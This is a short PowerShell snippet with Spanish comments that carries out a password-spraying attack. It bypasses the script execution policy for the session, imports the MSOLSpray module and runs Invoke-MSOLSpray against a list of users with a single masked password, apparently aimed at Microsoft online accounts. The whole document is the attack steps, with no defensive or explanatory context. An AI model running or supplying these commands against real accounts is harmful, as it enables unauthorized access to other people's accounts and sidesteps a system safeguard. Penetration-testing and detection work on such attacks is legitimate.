#Deshabilita de manera temporal la politica de ejecucion de firmas
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

#Importar los modulos del script MSOLSpray
Import-Module ./MSOLSpray.ps1

#Realizar ataque de pulverizacion de contraseñas
Invoke-MSOLSpray -UserList ./user.txt -Password ******
